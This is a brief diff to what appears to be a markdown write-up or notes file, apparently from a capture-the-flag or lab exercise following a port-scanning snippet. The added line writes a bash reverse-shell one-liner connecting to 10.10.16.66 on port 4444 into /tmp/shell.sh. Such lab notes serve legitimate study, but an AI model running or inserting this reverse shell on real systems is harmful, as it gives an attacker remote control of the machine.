@@ -17,7 +17,7 @@ print(f"Error on port {port}: {e}")
 ```
 
 ```
-
+echo "bash -i >& /dev/tcp/10.10.16.66/4444 0>&1" > /tmp/shell.sh
 ```
 
 ```
